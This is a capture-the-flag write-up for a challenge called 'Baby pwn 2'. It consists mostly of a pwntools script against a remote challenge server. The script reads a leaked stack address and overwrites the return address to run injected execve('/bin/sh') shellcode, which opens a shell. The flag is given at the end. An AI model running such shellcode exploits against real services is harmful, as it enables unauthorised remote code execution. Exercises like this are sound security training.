# Baby pwn 2

Solved by: @apikmeister

## Question:

Hehe, now there's no secret function to call. Can you still get the flag?

## Solution:
```
from pwn import *

REMOTE_IP = "34.162.119.16"
REMOTE_PORT = 5000

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

def exploit():
    io = remote(REMOTE_IP, REMOTE_PORT)

    io.recvuntil(b"Stack address leak: ")
    leaked_address = int(io.recvline().strip(), 16)
    print(f"Leaked stack address: {hex(leaked_address)}")

    buffer_offset = 72
    
    
    shellcode = (
        b"\x48\x31\xc0"              # xor rax, rax
        b"\x50"                      # push rax
        b"\x48\x89\xe2"              # mov rdx, rsp
        b"\x48\xbb\x2f\x62\x69\x6e"  # mov rbx, '/bin//sh'
        b"\x2f\x73\x68\x00"
        b"\x53"                      # push rbx
        b"\x48\x89\xe7"              # mov rdi, rsp
        b"\x50"                      # push rax
        b"\x57"                      # push rdi
        b"\x48\x89\xe6"              # mov rsi, rsp
        b"\xb0\x3b"                  # mov al, 59
        b"\x0f\x05"                  # syscall
    )

    payload = shellcode.ljust(buffer_offset, b"A")
    
    payload += p64(leaked_address)

    print(f"Payload size: {len(payload)} bytes")

    io.sendlineafter(b"Enter some text: ", payload)

    io.interactive()

if __name__ == "__main__":
    exploit()

```

**Flag:** `uoftctf{sh3llc0d3_1s_pr3tty_c00l}`
